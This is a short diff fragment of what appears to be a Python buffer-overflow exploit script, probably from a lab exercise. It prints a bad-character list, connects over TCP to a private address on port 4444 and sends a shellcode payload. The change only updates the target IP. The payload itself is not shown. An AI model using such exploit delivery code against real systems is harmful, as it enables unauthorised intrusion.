@@ -80,7 +80,7 @@ print("badchars: ", " ".join([hex(c) for c in badchars]))
 print("SENDING")
 import socket
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-s.connect(("192.168.107.45", 4444))
+s.connect(("192.168.129.45", 4444))
 s.send(shellcode)
 s.close()
 
